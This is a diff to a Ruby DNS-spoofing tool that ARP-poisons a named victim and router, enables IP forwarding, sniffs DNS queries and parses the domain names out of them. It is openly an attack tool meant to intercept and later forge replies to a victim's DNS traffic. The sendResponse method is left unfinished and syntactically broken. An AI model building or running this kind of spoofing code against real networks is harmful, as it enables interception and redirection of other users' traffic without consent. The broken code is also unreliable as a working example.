@@ -20,8 +20,7 @@ class DnsSpoof
         
         # Check for values
         if routerIP == nil || victimIP == nil || interface == nil
-            puts "Usage: routerIP victimIP interface\n"
-            exit
+            fatalError(")Usage: routerIP victimIP interface\n")
         end
         
         # Store global info
@@ -31,11 +30,18 @@ class DnsSpoof
         
         # Get the MAC address of the router
         @routerMAC = Utils.arp(routerIP, :iface => @interface)
+        if @routerMAC == nil
+            fatalError("Unable to get router MAC")
+        end
         
         # Get the MAC address of the victim
         @victimMAC = Utils.arp(victimIP, :iface => @interface)
+        if @victimMAC == nil
+            fatalError("Unable to get victim MAC")
+        end
         
         # Get our information
+        # TODO: CHANGE THIS TO ifconfig
         @ourInfo = Utils.whoami?(:iface => interface)
         
         # Enable IP forwarding based on the OS (Linux or OS X)
@@ -57,8 +63,7 @@ class DnsSpoof
         Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
         
         # Start DNS portion of program
-        #sniffPackets
-        Process.wait
+        sniffPackets
         
     end
 
@@ -74,14 +79,41 @@ private
         
         # Find the DNS packets
         capture.stream.each do |pkt|
-            packet = Packet.parse(pkt)
+            if Packet.has_data?
+                packet = Packet.parse(pkt)
+                
+                # Make sure we have a query packet
+                if packet.payload[2] == 1 && packet.payload[3] == 0
+                    domainName = getDomainName(packet)
+                    puts domainName
+                end
+            end
         end
-        
-        
     end
     
+    def sendResponse
+        
+        # Create the UDP packet
+        response = UDPPacket.new(
+    end
     
-    # Function for enabling packet forwarding based on OS type
+    def getDomainName(packet)
+        domainName = ""
+        count = 13
+        while count < 100
+            if packet.payload[count].to_s(base = 16).hex.chr == "\003"
+                domainName += "."
+            elsif packet.payload[count].to_s(base = 16).hex.chr == "\000"
+                return domainName
+            else
+                domainName += packet.payload[count].to_s(base = 16).hex.chr
+            end
+            
+            count += 1
+        end
+    end
+
+    # Function for enabling packet forwarding based on OS type (OS X and Linux)
     def DnsSpoof.forward(forward)
         
         if RUBY_PLATFORM =~ /darwin/
@@ -101,6 +133,11 @@ private
                 `echo 0 > /proc/sys/net/ipv4/ip_forward`
             end
         end
+    end
+        
+    def fatalError(message)
+        puts message
+        exit
     end
 end
 
